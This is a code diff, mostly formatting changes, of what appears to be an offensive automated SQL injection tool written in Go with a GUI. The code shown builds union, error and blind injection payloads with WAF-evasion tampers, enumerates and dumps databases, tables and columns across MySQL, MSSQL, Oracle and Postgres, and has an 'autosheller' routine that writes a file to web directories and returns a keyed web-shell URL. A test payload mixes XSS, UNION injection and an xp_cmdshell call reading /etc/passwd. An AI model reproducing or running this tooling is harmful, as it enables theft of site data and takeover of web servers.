@@ -1,18 +1,18 @@
 package injection
 
 import (
+	"XDGv2/auth"
+	"XDGv2/injection/mssql"
+	"XDGv2/injection/mysql"
+	"XDGv2/injection/oracle"
+	"XDGv2/injection/postgres"
+	"XDGv2/manager"
+	"XDGv2/tamper"
+	"XDGv2/utils"
+	"XDGv2/waf"
 	"encoding/hex"
 	"errors"
 	"fmt"
-	"git.quartzinc.dev/Zertex/XDGv2/auth"
-	"git.quartzinc.dev/Zertex/XDGv2/injection/mssql"
-	"git.quartzinc.dev/Zertex/XDGv2/injection/mysql"
-	"git.quartzinc.dev/Zertex/XDGv2/injection/oracle"
-	"git.quartzinc.dev/Zertex/XDGv2/injection/postgres"
-	"git.quartzinc.dev/Zertex/XDGv2/manager"
-	"git.quartzinc.dev/Zertex/XDGv2/tamper"
-	"git.quartzinc.dev/Zertex/XDGv2/utils"
-	"git.quartzinc.dev/Zertex/XDGv2/waf"
 	"github.com/alecthomas/geoip"
 	"github.com/corpix/uarand"
 	"github.com/spf13/viper"
@@ -28,28 +28,28 @@ import (
 
 var (
 	InjectableSkipped = errors.New("injectable skipped")
-	QueryFailed = errors.New("query failed")
-	UnknownColumn = errors.New("unknown column")
+	QueryFailed       = errors.New("query failed")
+	UnknownColumn     = errors.New("unknown column")
 )
 
 var TestPayload = "') AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\"XSS\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#"
 
-var U_Vectors = map[string]string {
+var U_Vectors = map[string]string{
 	"single": "",
-	"multi": "",
+	"multi":  "",
 }
 
-var B_Vectors = map[string] string {
-	"gen_and_where": "%s AND %s %s",
-	"gen_or_where": "%s OR %s %s",
-	"gen_or_not_where": "%s OR NOT %s %s",
+var B_Vectors = map[string]string{
+	"gen_and_where":     "%s AND %s %s",
+	"gen_or_where":      "%s OR %s %s",
+	"gen_or_not_where":  "%s OR NOT %s %s",
 	"gen_and_where_sub": "%s AND 8839=(CASE WHEN (%s) THEN 8839 ELSE (SELECT 2918 UNION SELECT 4141) END))%s",
-	"gen_or_where_sub": "%s OR 8839=(CASE WHEN (%s) THEN 8839 ELSE (SELECT 2918 UNION SELECT 4141) END))%s",
-	"gen_rep": "%s(SELECT (CASE WHEN (%s) THEN 1 ELSE (SELECT 9175 UNION SELECT 7580) END))%s",
-	"gen_having": "%s HAVING %s%s",
+	"gen_or_where_sub":  "%s OR 8839=(CASE WHEN (%s) THEN 8839 ELSE (SELECT 2918 UNION SELECT 4141) END))%s",
+	"gen_rep":           "%s(SELECT (CASE WHEN (%s) THEN 1 ELSE (SELECT 9175 UNION SELECT 7580) END))%s",
+	"gen_having":        "%s HAVING %s%s",
 }
 
-var Modulators = [][]string {
+var Modulators = [][]string{
 	{"", ""},
 	{"", "#"},
 	{"", "# %s"},
@@ -65,9 +65,9 @@ var Modulators = [][]string {
 	{"", " AND \"%s\" LIKE \"%s"},
 	{"\"", " AND \"%s\" LIKE \"%s"},
 	{"\")", " AND (\"%s\" LIKE \"%s"},
-	{""," AND '%d'='%d"},
-	{"'"," AND '%d'='%d"},
-	{"')"," AND ('%d'='%d"}, // 17
+	{"", " AND '%d'='%d"},
+	{"'", " AND '%d'='%d"},
+	{"')", " AND ('%d'='%d"}, // 17
 
 	{"))", " AND ((%d=%%d"},
 	{")))", " AND (((%d=%d"},
@@ -80,16 +80,16 @@ var Modulators = [][]string {
 	{"'))", " AND (('%s' LIKE '%s"},
 	{"')))", " AND ((('%s' LIKE '%s"}, // 27
 
-	{"'))"," AND (('%d'='%d"},
-	{"')))"," AND ((('%d'='%d"},
-	{"AND %d'='%d'"," AND '%d'='%d"},
-	{"AND %d'='%d')"," AND ('%d'='%d"},
-	{"AND %d'='%d'))"," AND (('%d'='%d"},
-	{"AND %d'='%d')))"," AND ((('%d'='%d"},
-	{"AND %d=%d"," AND %d=%d"},
-	{"AND %d=%d)"," AND (%d=%d"},
-	{"AND %d=%d))"," AND ((%d=%d"},
-	{"AND %d=%d)))"," AND (((%d=%d"}, // 37
+	{"'))", " AND (('%d'='%d"},
+	{"')))", " AND ((('%d'='%d"},
+	{"AND %d'='%d'", " AND '%d'='%d"},
+	{"AND %d'='%d')", " AND ('%d'='%d"},
+	{"AND %d'='%d'))", " AND (('%d'='%d"},
+	{"AND %d'='%d')))", " AND ((('%d'='%d"},
+	{"AND %d=%d", " AND %d=%d"},
+	{"AND %d=%d)", " AND (%d=%d"},
+	{"AND %d=%d))", " AND ((%d=%d"},
+	{"AND %d=%d)))", " AND (((%d=%d"}, // 37
 	{"AND %d=%d", " AND %d=%d"},
 }
 
@@ -161,16 +161,16 @@ func Init() {
 }
 
 type StructureDatabase struct {
-	Object *widgets.QTreeWidgetItem
-	SIndex int
-	Name string
+	Object   *widgets.QTreeWidgetItem
+	SIndex   int
+	Name     string
 	Selected bool
-	Tables []StructureTable
+	Tables   []StructureTable
 }
 
 func (sd *StructureDatabase) GetIndex() int {
 	ind := 0
-	for _,tb := range sd.Tables {
+	for _, tb := range sd.Tables {
 		ind += tb.Index
 	}
 	return ind
@@ -193,14 +193,14 @@ func (sd *StructureDatabase) GetColumnCount() int {
 }
 
 type StructureTable struct {
-	Object *widgets.QTreeWidgetItem
-	Name string
+	Object   *widgets.QTreeWidgetItem
+	Name     string
 	Selected bool
-	SIndex int
-	Index int
+	SIndex   int
+	Index    int
 	RowCount int
-	Columns []StructureColumn
-	Rows [][]string
+	Columns  []StructureColumn
+	Rows     [][]string
 }
 
 func (st *StructureTable) GetColumnNameArray() []string {
@@ -212,10 +212,10 @@ func (st *StructureTable) GetColumnNameArray() []string {
 }
 
 type StructureColumn struct {
-	Object *widgets.QTreeWidgetItem
-	SIndex int
-	Name string
-	Type string
+	Object   *widgets.QTreeWidgetItem
+	SIndex   int
+	Name     string
+	Type     string
 	Selected bool
 }
 
@@ -262,11 +262,11 @@ type Injection struct {
 
 type Details struct {
 	RowCount int
-	TBIndex int
-	DBIndex int
+	TBIndex  int
+	DBIndex  int
 	Database string
-	Table string
-	Columns []string
+	Table    string
+	Columns  []string
 }
 
 func (inj *Injection) GetSystemDBNames() []string {
@@ -315,10 +315,10 @@ func (inj *Injection) GetStructure(siteItem *widgets.QTreeWidgetItem, detailCh *
 	dbSem := make(chan interface{}, 25)
 	//inj.Structure = make([]StructureDatabase, dbCount-1)
 
-	for dbIndex:=0; dbIndex < dbCount; dbIndex++ {
+	for dbIndex := 0; dbIndex < dbCount; dbIndex++ {
 		dbI := dbIndex
 		dbWg.Add(1)
-		dbSem<-0
+		dbSem <- 0
 		go func(dbIndex int) {
 			defer func() {
 				dbWg.Done()
@@ -339,7 +339,7 @@ func (inj *Injection) GetStructure(siteItem *widgets.QTreeWidgetItem, detailCh *
 			UILock.Unlock()
 
 			inj.Structure = append(inj.Structure, StructureDatabase{
-				Object:	  dbItem,
+				Object:   dbItem,
 				Name:     database,
 				Selected: false,
 				Tables:   nil,
@@ -366,7 +366,7 @@ func (inj *Injection) GetStructure(siteItem *widgets.QTreeWidgetItem, detailCh *
 				tWG.Add(1)
 				go func(tbIndex int, database string) {
 					defer func() {
-						<- tableSem
+						<-tableSem
 						tWG.Done()
 					}()
 					table, err := inj.GetTable(database, tbIndex)
@@ -393,7 +393,7 @@ func (inj *Injection) GetStructure(siteItem *widgets.QTreeWidgetItem, detailCh *
 					inj.Structure[dbIndex].Tables[tbIndex].Columns = make([]StructureColumn, cCount)
 					inj.Structure[dbIndex].Tables[tbIndex].Object.SetText(1, fmt.Sprintf("%d", cCount))
 
-					for cIndex := 0; cIndex < cCount; cIndex ++ {
+					for cIndex := 0; cIndex < cCount; cIndex++ {
 						columnSem <- 0
 						cWG.Add(1)
 						go func(database, table string, cIndex int) {
@@ -642,7 +642,7 @@ func (inj *Injection) ToFormattedString() string {
 	case UNION:
 		a = "[U]"
 		var c []string
-		for i:=0; i < inj.UCount; i++ {
+		for i := 0; i < inj.UCount; i++ {
 			if i == inj.UInj {
 				c = append(c, "i")
 			} else {
@@ -702,7 +702,7 @@ func ParseUrlString(str string) *Injection {
 		return nil
 	}
 
-	if parts[2] == "[U]"{
+	if parts[2] == "[U]" {
 		a := strings.Split(parts[3], ",")
 		var i int
 		for b, v := range a {
@@ -721,11 +721,11 @@ func ParseUrlString(str string) *Injection {
 			Parameter: parts[1],
 			Tampers:   nil,
 			//Original:  "",
-			UCount:    len(a),
-			UInj:      i,
-			Mod:       mod,
-			DBType:    dbType,
-			Skip:      make(chan interface{}),
+			UCount: len(a),
+			UInj:   i,
+			Mod:    mod,
+			DBType: dbType,
+			Skip:   make(chan interface{}),
 		}
 
 	} else if parts[2] == "[E]" {
@@ -758,11 +758,11 @@ func ParseUrlString(str string) *Injection {
 			Parameter: parts[1],
 			Tampers:   nil,
 			//Original:  "",
-			UCount:    0,
-			UInj:      0,
-			Mod:       mod,
-			DBType:    dbType,
-			Skip:      make(chan interface{}),
+			UCount: 0,
+			UInj:   0,
+			Mod:    mod,
+			DBType: dbType,
+			Skip:   make(chan interface{}),
 		}
 	} else if parts[2] == "[B]" {
 		p := strings.Split(parts[3], "!")
@@ -776,11 +776,11 @@ func ParseUrlString(str string) *Injection {
 			Parameter: parts[1],
 			Tampers:   nil,
 			//Original:  "",
-			UCount:    0,
-			UInj:      0,
-			Mod:       mod,
-			DBType:    dbType,
-			Skip:      make(chan interface{}),
+			UCount: 0,
+			UInj:   0,
+			Mod:    mod,
+			DBType: dbType,
+			Skip:   make(chan interface{}),
 		}
 	}
 	return inj
@@ -791,7 +791,7 @@ func (inj *Injection) BuildInjection(query string, index int, hex bool) (*url.UR
 
 	_u, _ := url.Parse(inj.Base.String())
 	qu := inj.Base.Query()
-	qu.Set(inj.Parameter, inj.Base.Query().Get(inj.Parameter) + " " + tamper.Tamper(payload, inj.Tampers))
+	qu.Set(inj.Parameter, inj.Base.Query().Get(inj.Parameter)+" "+tamper.Tamper(payload, inj.Tampers))
 	_u.RawQuery = qu.Encode()
 
 	return _u, begin, end
@@ -804,9 +804,8 @@ func (inj *Injection) BuildUnionInjection(query string, secondary string, index 
 	u, _ := url.Parse(inj.Base.String())
 
 	qu := u.Query()
-	qu.Set(inj.Parameter, u.Query().Get(inj.Parameter) + " " + tamper.Tamper(payload, inj.Tampers))
+	qu.Set(inj.Parameter, u.Query().Get(inj.Parameter)+" "+tamper.Tamper(payload, inj.Tampers))
 	u.RawQuery = qu.Encode()
-
 
 	return u.String(), begin, end
 }
@@ -928,12 +927,12 @@ func WAFTest(_url string) (bool, string, float32, []string, string, int) {
 		}
 	}
 
-	resp, body, err := manager.PManager.Get(_url + url.QueryEscape(TestPayload), uarand.GetRandom())
+	resp, body, err := manager.PManager.Get(_url+url.QueryEscape(TestPayload), uarand.GetRandom())
 	if err != nil {
 		return true, res, 0, []string{"space2comment"}, "", PossibleDBMS
 	}
 	_, s := waf.IsWAF(resp, body)
-	return true, res, 0/*utils.CompareTwoStrings(res, body)*/, s, resp.Request.RemoteAddr, PossibleDBMS
+	return true, res, 0 /*utils.CompareTwoStrings(res, body)*/, s, resp.Request.RemoteAddr, PossibleDBMS
 }
 
 func HasFlag(body string) (bool, int) {
@@ -1007,20 +1006,28 @@ func GetVectorName(vector string) string {
 
 func TechniqueString(tech int) string {
 	switch tech {
-	case ERROR: return "Error"
-	case UNION: return "Union"
-	case BLIND: return "Blind"
-	case STACKED: return "Stacked"
+	case ERROR:
+		return "Error"
+	case UNION:
+		return "Union"
+	case BLIND:
+		return "Blind"
+	case STACKED:
+		return "Stacked"
 	}
 	return "N/A"
 }
 
 func DBMSString(db int) string {
 	switch db {
-	case MYSQL: return "MySQL"
-	case MSSQL: return "MSSQL"
-	case ORACLE: return "Oracle"
-	case POSTGRES: return "PostGreSQL"
+	case MYSQL:
+		return "MySQL"
+	case MSSQL:
+		return "MSSQL"
+	case ORACLE:
+		return "Oracle"
+	case POSTGRES:
+		return "PostGreSQL"
 	}
 	return "N/A"
 }
@@ -1034,12 +1041,12 @@ func (inj *Injection) BlindGetDataLength(query string) (int, error) {
 	if inj.Vector[0] == '(' {
 		prefix = ""
 	}
-	for i:=1; i <= 32; i++ {
+	for i := 1; i <= 32; i++ {
 		payload, _, _ := BuildInjectionRaw(inj.Vector, query, "", prefix, fmt.Sprintf("=%d %s", i, inj.Suffix), BLIND, inj.DBType, 0, 0, 0, 1, false, false)
 
 		_u, _ := url.Parse(inj.Base.String())
 		qu := inj.Base.Query()
-		qu.Set(inj.Parameter, inj.Base.Query().Get(inj.Parameter) + tamper.Tamper(payload, inj.Tampers))
+		qu.Set(inj.Parameter, inj.Base.Query().Get(inj.Parameter)+tamper.Tamper(payload, inj.Tampers))
 		_u.RawQuery = qu.Encode()
 
 		_, res, err := manager.PManager.GetWithoutFailWithErrors(_u.String(), inj.UserAgent, &inj.Errors, &inj.Skip)
@@ -1067,7 +1074,7 @@ func (inj *Injection) BlindGetData(query string) (string, error) {
 	}
 
 	var output string
-	for i:=0; i < l; i++ {
+	for i := 0; i < l; i++ {
 		for char := 32; char < 127; char++ {
 			payload, _, _ := BuildInjectionRaw(inj.Vector, query, "", prefix, fmt.Sprintf("='%s' %s", string(rune(char)), inj.Suffix), BLIND, inj.DBType, 0, 0, i, 1, false, false)
 
@@ -1183,7 +1190,7 @@ func (inj *Injection) GetDatabase(index int) (string, error) {
 				}
 
 				output += p
-				_index ++
+				_index++
 				if len(p) == inj.ChunkSize {
 					continue
 				}
@@ -1196,7 +1203,7 @@ func (inj *Injection) GetDatabase(index int) (string, error) {
 func (inj *Injection) GetCurrentDatabase() (string, error) {
 	index := 0
 	output := ""
-	for i:=0; i<2; {
+	for i := 0; i < 2; {
 		select {
 		case <-utils.Done:
 			return "", errors.New("exit early")
@@ -1234,7 +1241,7 @@ func (inj *Injection) GetCurrentDatabase() (string, error) {
 				}
 
 				output += p
-				index ++
+				index++
 				if len(p) == inj.ChunkSize {
 					continue
 				}
@@ -1247,7 +1254,7 @@ func (inj *Injection) GetCurrentDatabase() (string, error) {
 	return "", QueryFailed
 }
 
-func (inj *Injection) GetDBVersion () (string, error) {
+func (inj *Injection) GetDBVersion() (string, error) {
 	if len(inj.DBVersion) != 0 {
 		return inj.DBVersion, nil
 	}
@@ -1347,7 +1354,7 @@ func (inj *Injection) GetDBUser() (string, error) {
 				return "", nil
 			}
 			output += p
-			_index ++
+			_index++
 			if len(p) == inj.ChunkSize {
 				continue
 			}
@@ -1414,7 +1421,7 @@ func (inj *Injection) GetTable(database string, index int) (string, error) {
 			case MYSQL:
 				query = fmt.Sprintf(mysql.Queries["table_name"], (inj.ChunkSize*_index)+1, inj.ChunkSize, utils.HexStr(database), index)
 			case MSSQL:
-				query = fmt.Sprintf(strings.ReplaceAll(mssql.Queries["table_name"], "%s", database),(inj.ChunkSize*_index)+1, inj.ChunkSize, index)
+				query = fmt.Sprintf(strings.ReplaceAll(mssql.Queries["table_name"], "%s", database), (inj.ChunkSize*_index)+1, inj.ChunkSize, index)
 			case POSTGRES:
 				query = fmt.Sprintf(postgres.Queries["table_name"], (inj.ChunkSize*_index)+1, inj.ChunkSize, postgres.ConvertStringToChars(database), index)
 			case ORACLE:
@@ -1435,7 +1442,7 @@ func (inj *Injection) GetTable(database string, index int) (string, error) {
 					return "", nil
 				}
 				output += p
-				_index ++
+				_index++
 				if len(p) == inj.ChunkSize {
 					continue
 				}
@@ -1525,7 +1532,7 @@ func (inj *Injection) GetColumn(database string, table string, index int) (strin
 				}
 
 				output += p
-				_index ++
+				_index++
 				if len(p) == inj.ChunkSize {
 					continue
 				}
@@ -1541,7 +1548,7 @@ func (inj *Injection) GetColumnType(database string, table string, index int) (s
 	for {
 		select {
 		case <-utils.Done:
-		
+
 			return "", errors.New("exit early")
 		case <-inj.Skip:
 			return "", InjectableSkipped
@@ -1574,7 +1581,7 @@ func (inj *Injection) GetColumnType(database string, table string, index int) (s
 				}
 
 				output += p
-				_index ++
+				_index++
 				if len(p) == inj.ChunkSize {
 					continue
 				}
@@ -1606,7 +1613,7 @@ func (inj *Injection) GetRowCount(database string, table string) (int, error) {
 				query = fmt.Sprintf(oracle.Queries["row_count"], database, table)
 			}
 
-			u, begincap, endcap := inj.BuildInjection(query,1, false)
+			u, begincap, endcap := inj.BuildInjection(query, 1, false)
 
 			_, body, err := manager.PManager.GetWithoutFailWithErrors(u.String(), inj.UserAgent, &inj.Errors, &inj.Skip)
 			if err != nil {
@@ -1669,7 +1676,7 @@ func (inj *Injection) DumpColumn(database string, table string, column string, o
 				}
 
 				output += p
-				_index ++
+				_index++
 				if len(p) == inj.ChunkSize {
 					continue
 				}
@@ -1745,7 +1752,7 @@ func (inj *Injection) DumpMultiColumn(database string, table string, columns []s
 				}
 
 				output += p
-				_index ++
+				_index++
 				if len(p) == inj.ChunkSize {
 					continue
 				}
@@ -1775,7 +1782,7 @@ func (inj *Injection) GetTableWithColumn(database string, column string, index i
 		default:
 			var blacklistLikes []string
 			for _, bl := range blacklist {
-				blacklistLikes = append(blacklistLikes, fmt.Sprintf("AND COLUMN_NAME NOT LIKE (0x%s)", utils.HexStr(fmt.Sprintf("%%%s%%",bl))))
+				blacklistLikes = append(blacklistLikes, fmt.Sprintf("AND COLUMN_NAME NOT LIKE (0x%s)", utils.HexStr(fmt.Sprintf("%%%s%%", bl))))
 			}
 
 			var query string
@@ -1803,7 +1810,7 @@ func (inj *Injection) GetTableWithColumn(database string, column string, index i
 					return "", nil
 				}
 				output += p
-				_index ++
+				_index++
 				if len(p) == inj.ChunkSize {
 					continue
 				}
@@ -1904,7 +1911,7 @@ func (inj *Injection) GetColumnFromTable(database string, tbl string, column str
 					return "", errors.New("null output")
 				}
 				output += p
-				_index ++
+				_index++
 				if len(p) == inj.ChunkSize {
 					continue
 				}
@@ -1914,7 +1921,7 @@ func (inj *Injection) GetColumnFromTable(database string, tbl string, column str
 	}
 }
 
-var FILE_PATH_REGEXES = []*regexp.Regexp {
+var FILE_PATH_REGEXES = []*regexp.Regexp{
 	regexp.MustCompile(`<b>(?P<result>[^<>]+?)</b> on line \d+`),
 	regexp.MustCompile(`\bin (?P<result>[^<>'\"]+?)['\"]? on line \d+`),
 	regexp.MustCompile(`(?:[>(\[\s])(?P<result>[A-Za-z]:[\\/][\w. \\/-]*)`),
@@ -1935,7 +1942,6 @@ func (inj *Injection) GetFilePath() (string, error) {
 			return "", err
 		}
 
-
 		//body = strings.ReplaceAll(strings.ReplaceAll(string(bluemonday.StrictPolicy().SanitizeBytes([]byte(body))), "\r", ""), "\n", " ")
 
 		for _, reg := range FILE_PATH_REGEXES {
@@ -1947,7 +1953,7 @@ func (inj *Injection) GetFilePath() (string, error) {
 	return "", QueryFailed
 }
 
-var CommonDirectories = []string {
+var CommonDirectories = []string{
 	"/var/www/",
 	"/var/www/html",
 	"/var/www/htdocs",
@@ -1980,7 +1986,7 @@ func (inj *Injection) DumpFile(data, rpath string) (string, error) {
 	}
 
 	qu := inj.Base.Query()
-	qu.Set(inj.Parameter, inj.Base.Query().Get(inj.Parameter) + " " + tamper.Tamper(fmt.Sprintf(inj.Vector, ParseModulator(inj.Prefix), strings.Join(nulls, ","), "", ParseModulator(inj.Suffix)), inj.Tampers))
+	qu.Set(inj.Parameter, inj.Base.Query().Get(inj.Parameter)+" "+tamper.Tamper(fmt.Sprintf(inj.Vector, ParseModulator(inj.Prefix), strings.Join(nulls, ","), "", ParseModulator(inj.Suffix)), inj.Tampers))
 	_u.RawQuery = qu.Encode()
 
 	//payload, _ := inj.BuildInjection(query, 1, false)
@@ -1996,7 +2002,7 @@ func (inj *Injection) DumpFile(data, rpath string) (string, error) {
 
 	x := path.Dir(inj.Base.Path)
 
-	_u.Parse(path.Join(x, viper.GetString("autosheller.filename") + "?q=1"))
+	_u.Parse(path.Join(x, viper.GetString("autosheller.filename")+"?q=1"))
 
 	v := _u.String()
 	_, body, err = manager.PManager.Get(v, inj.UserAgent)
@@ -2004,8 +2010,8 @@ func (inj *Injection) DumpFile(data, rpath string) (string, error) {
 		return "", err
 	}
 
-	if strings.Contains(body,"200") {
-		shell, _ := _u.Parse(path.Join(x, viper.GetString("autosheller.filename") + fmt.Sprintf("?key=%s", viper.GetString("autosheller.key"))))
+	if strings.Contains(body, "200") {
+		shell, _ := _u.Parse(path.Join(x, viper.GetString("autosheller.filename")+fmt.Sprintf("?key=%s", viper.GetString("autosheller.key"))))
 		return shell.String(), nil
 	}
 
@@ -2028,11 +2034,11 @@ func U_GetSchemaDIOS(inj *Injection) (map[string]map[string][]string, error) {
 	sep := utils.StringOfLength(4)
 
 	if inj.UCount == 0 {
-		inj.UCount=1
+		inj.UCount = 1
 	}
 
 	var nulls []string
-	for i:=0; i < inj.UCount; i++ {
+	for i := 0; i < inj.UCount; i++ {
 		if i == inj.UInj {
 			nulls = append(nulls, fmt.Sprintf(mysql.U_DIOS["get_schema"], utils.HexStr(sel), utils.HexStr(sep), utils.HexStr(sep), utils.HexStr(sel)))
 		} else {
@@ -2046,7 +2052,7 @@ func U_GetSchemaDIOS(inj *Injection) (map[string]map[string][]string, error) {
 	}
 	qu := u.Query()
 
-	qu.Set(inj.Parameter, qu.Get(inj.Parameter) + tamper.Tamper(fmt.Sprintf(U_Vectors["multi"], ParseModulator(inj.Prefix), strings.Join(nulls, ","), "", ParseModulator(inj.Suffix)), inj.Tampers))
+	qu.Set(inj.Parameter, qu.Get(inj.Parameter)+tamper.Tamper(fmt.Sprintf(U_Vectors["multi"], ParseModulator(inj.Prefix), strings.Join(nulls, ","), "", ParseModulator(inj.Suffix)), inj.Tampers))
 	u.RawQuery = qu.Encode()
 	_, body, err := manager.PManager.Get(u.String(), inj.UserAgent)
 	if err != nil {
@@ -2060,7 +2066,7 @@ func U_GetSchemaDIOS(inj *Injection) (map[string]map[string][]string, error) {
 	if len(data) <= 2 {
 		return nil, errors.New("dios not possible")
 	}
-	for _,k := range data {
+	for _, k := range data {
 		skem := strings.Split(k, sep)
 		if len(skem) != 3 {
 			return nil, errors.New("dios not possible")
@@ -2076,7 +2082,7 @@ func U_GetSchemaDIOS(inj *Injection) (map[string]map[string][]string, error) {
 			output[db] = make(map[string][]string)
 		}
 
-		if _,ok := output[db][tbl]; !ok {
+		if _, ok := output[db][tbl]; !ok {
 			output[db][tbl] = make([]string, 0)
 		}
 
@@ -2090,7 +2096,7 @@ func U_DumpTableDIOS(inj *Injection, database string, tbl string, cols []string)
 	sel := utils.StringOfLength(4)
 
 	var nulls []string
-	for i:=0; i < inj.UCount; i++ {
+	for i := 0; i < inj.UCount; i++ {
 		if i == inj.UInj {
 			nulls = append(nulls, fmt.Sprintf(mysql.U_DIOS["dump"], database, tbl, utils.HexStr(sel), strings.Join(cols, ",0x2c,"), utils.HexStr(sel)))
 		} else {
@@ -2103,7 +2109,7 @@ func U_DumpTableDIOS(inj *Injection, database string, tbl string, cols []string)
 		return nil, err
 	}
 	qu := u.Query()
-	qu.Set(inj.Parameter, qu.Get(inj.Parameter) + " " + tamper.Tamper(fmt.Sprintf(U_Vectors["multi"], ParseModulator(inj.Prefix), strings.Join(nulls, ","), "", ParseModulator(inj.Suffix)), inj.Tampers))
+	qu.Set(inj.Parameter, qu.Get(inj.Parameter)+" "+tamper.Tamper(fmt.Sprintf(U_Vectors["multi"], ParseModulator(inj.Prefix), strings.Join(nulls, ","), "", ParseModulator(inj.Suffix)), inj.Tampers))
 	u.RawQuery = qu.Encode()
 	_, body, err := manager.PManager.Get(u.String(), inj.UserAgent)
 	if err != nil {
@@ -2115,7 +2121,7 @@ func U_DumpTableDIOS(inj *Injection, database string, tbl string, cols []string)
 
 	var output []string
 
-	for _,k := range data {
+	for _, k := range data {
 		output = append(output, strings.ReplaceAll(k, sel, ""))
 	}
 
